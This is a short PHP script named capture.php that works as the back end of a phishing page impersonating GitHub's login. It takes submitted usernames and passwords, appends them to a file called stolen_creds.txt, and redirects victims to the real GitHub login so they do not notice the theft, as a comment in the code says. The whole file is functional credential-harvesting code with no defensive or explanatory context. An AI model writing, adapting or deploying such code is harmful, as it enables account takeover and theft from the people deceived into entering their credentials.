<?php
// capture.php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $data = "User: " . $username . " | Pass: " . $password . "\n";
    
    // Save to a local file
    file_put_contents("stolen_creds.txt", $data, FILE_APPEND);
    
    // Redirect the user back to the actual GitHub login page so they don't suspect anything
    header("Location: https://github.com/login");
    exit();
}
?>
